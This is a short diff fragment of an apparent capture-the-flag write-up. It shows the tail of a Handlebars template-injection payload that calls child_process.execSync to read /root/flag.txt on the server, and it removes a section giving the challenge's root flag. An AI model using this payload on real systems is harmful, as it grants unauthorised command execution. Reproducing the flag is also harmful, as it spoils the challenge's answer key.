@@ -146,9 +146,3 @@ function Function() { [native code] }
 {{this.push "return process.mainModule.require('child_process')\
 	.execSync('cat /root/flag.txt')"}}
 ```
-
----
-
-## FLAG
-
-ROOT: 6b258d726d287462d60c103d0142a81c
